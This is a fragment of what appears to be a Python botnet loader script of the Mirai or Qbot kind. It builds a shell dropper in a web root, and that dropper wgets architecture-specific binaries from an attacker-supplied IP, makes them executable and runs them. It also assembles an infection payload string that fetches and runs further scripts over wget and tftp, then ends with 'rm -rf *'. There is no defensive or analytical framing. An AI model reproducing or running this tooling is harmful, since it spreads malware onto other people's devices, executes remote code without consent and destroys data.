...
if len(sys.argv) < 3:
    print("\x1b[31mIncorrect Usage! ARG 1 fff ARG 2 ip ARG 3 bins name\x1b[0m")
    sys.exit()
...
print "         \x1b[1;31m[\x1b[1;92mChill\x1b[1;31m]"
arch_question = raw_input("\x1b[1;96mDownload Cross Compilers? y/n:\x1b[0m")
...
for i in compileas:
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/' + i + '; chmod +x ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/'+prefix+'.sh')
...
payload = "cd /tmp || cd /run || cd /; wget http://"+ip+"/"+prefix+".sh; chmod 777 "+prefix+".sh; sh "+prefix+".sh; tftp "+ip+" -c get "+prefix+"tftp1.sh; chmod 777 "+prefix+"tftp1.sh; sh "+prefix+"tftp1.sh; tftp -r "+prefix+"tftp2.sh -g "+ip+"; chmod 777 "+prefix+"tftp2.sh; sh "+prefix+"tftp2.sh; rm -rf "+prefix+"bins.sh "+prefix+"tftp1.sh "+prefix+"tftp2.sh; rm -rf *"
